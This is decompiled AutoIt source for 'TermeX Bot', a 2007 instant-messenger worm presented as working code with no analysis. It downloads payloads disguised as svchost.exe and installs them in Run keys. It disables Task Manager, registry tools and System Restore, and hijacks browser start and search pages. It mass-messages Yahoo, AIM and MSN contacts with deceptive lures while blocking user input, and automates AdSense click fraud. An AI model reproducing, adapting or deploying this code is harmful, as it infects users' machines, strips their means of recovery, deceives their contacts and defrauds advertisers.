; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\Ngo Duy Bien.SHINICHI\Desktop\New Folder\VR\bin3.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------

; Name: TermeX Bot
; Version : 4.0
; Usage : Advertise via Y!M,MSN,AIM and Auto-click Function
; Published : 30 April 2007
;---------------------------------------------------------------
;set the number_of_popup to 0 if you do not want to use it

; Variables
#NoTrayIcon
$website = "http://moneyisunlimited.com"
$website2 = "http://moneyisunlimited.com"
$website3 = "http://moneyisunlimited.com"
$download = "http://moneyisunlimited.com"
$auto_click_0 = "no"
$auto_click = "yes"
$number_of_popup = "1"
$number_of_messages = "5"
$time_msg = "200000"
$time_popup = "600000"
$pub_id = "pub-8259736116882000"

; List of random keywords
Dim $key[6]
$key[0] = "debt consolidation"
$key[1] = "credit card"
$key[2] = "casino"
$key[3] = "web hosting"
$key[4] = "insurance"
$key[5] = "health care"

; Click on Google adsense's ads
If $auto_click_0 = "yes" then
$title = WinGetTitle("Money Is Unlimited", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 371, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf
EndIf

; Infect into system
If Not FileExists(@WindowsDir & "\svchost.exe") Then
	InetGet ("" & $download & "/zun.exe", @WindowsDir & "\svchost.exe", 0, 1)
	InetGet ("" & $download & "/zin.exe", @WindowsDir & "\svhost32.exe", 0, 1)
	Sleep(3000)
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\svchost.exe")
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost32.exe")
EndIf

; Write Registry keys
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Google\GoogleToolbarNotifier", "ShowTrayIcon", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Google\GoogleToolbarNotifier", "KeepDS", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Google\GoogleToolbarNotifier", "ShowTrayIcon", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Use Search Asst", "REG_SZ", "no")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Search Assistant", "DefaultSearchURL", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Search Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Search Bar", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchUrl", "", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore", "DisableConfig", "REG_SZ", "1")


;Get_real_name
$msg = RegRead("HKEY_CURRENT_USER\Software\yahoo\pager" , "Yahoo! User ID" )
if $msg = "" then
If FileExists(@ProgramFilesDir & "\Yahoo!\Messenger\logs") Then
	$search = FileFindFirstFile(@ProgramFilesDir & "\Yahoo!\Messenger\logs\*.log")
	$file = FileFindNextFile($search)
	$array = StringSplit($file, '_', 1)
	$array = StringSplit($array[2], '.', 1)

	If not $array[1] = "User" or "Admin" or "Administrator" then
    $msg = " ( sent by " & $array[1] & " , no worm ) "
	else
	$msg = ""
	EndIf

EndIf
else
	$msg = " ( sent by " & $msg & " , no worm ) "
EndIf

; List of random messages
Dim $tin[13]
$tin[0] = "This is my one-off e-card for you ^_^ " & $website & "/?id=ecard :x " & $msg & ""
$tin[1] = "making money online never be easier : " & $website2 & "/?id=tips >:D< " & $msg & ""
$tin[2] = "" & $website & "/?id=think :D"
$tin[3] = "Harry Potter 7 :x : " & $website & "/hp7 << " & $msg & ""
$tin[4] = "Fuck !!! X-( " & $website & "/?id=password << "
$tin[5] = "I made 10 gifts for the first 10 people post comments on my own page : " & $website3 & " ^_^ "
$tin[6] = "Be careful. There’ll be earthquake tonite !!! " & $website2 & "/?id=warning << " & $msg & ""
$tin[7] = "My new personal site : " & $website & " c0ol !!! "
$tin[8] = "Microsoft to release 2007 free-of-charge packs of Windows Vista for its first 2007 online registered users: " & $website2 & "/?id=ms << " & $msg & ""
$tin[9] = "wtf is this ? wanna give me a shit ?  " & $website2 & "/?id=news  X-(  "
$tin[10] = "Kaka transfer to Man Utd !! " & $website2 & "/?news_id=15458 " & $msg & ""
$tin[11] = "Yahoo to charge fee for its YM service " & $website & "/?id=ym " & $msg & ""
$tin[12] = "OMG ! She is really beautiful :x " & $website & "/?DSC00273.JPG " & $msg & ""

; Main process
sleep(300000)
$count = 1
While $count <= $number_of_messages

$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)

	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

Sleep($time_msg)
$count = $count + 1
WEnd

;Auto popup
$j = 1
While $j <= $number_of_popup

	Sleep($time_popup)
	$keyword = $key[Random(0,5,1)]
	$ws = "http://www.google.com/custom?q=" & $keyword & "&client=" & $pub_id & "&cof=GALT%3A%23008000%3BGL%3A1%3BDIV%3A%23336699%3BVLC%3A663399%3BAH%3Acenter%3BBGC%3AFFFFFF%3BLBGC%3A336699%3BALC%3A0000FF%3BLC%3A0000FF%3BT%3A000000%3BGFNT%3A0000FF%3BGIMP%3A0000FF%3BFORID%3A1"
	Run(""&@ProgramFilesDir&"\Internet Explorer\IEXPLORE.EXE " & $ws & "", "", @SW_MAXIMIZE)

If $auto_click = "yes" then
	BlockInput (1)
	sleep(4500)
	$title = WinGetTitle(""& $keyword &"", "")
	WinActivate($title)
	$pos = MouseGetPos()
	MouseClick("left", 433, 310, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	sleep(3500)
	WinKill(WinGetTitle(""))
	BlockInput (0)
EndIf

	$j = $j + 1
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\Ngo Duy Bien.SHINICHI\Desktop\New Folder\VR\bin3.au3>
; ----------------------------------------------------------------------------

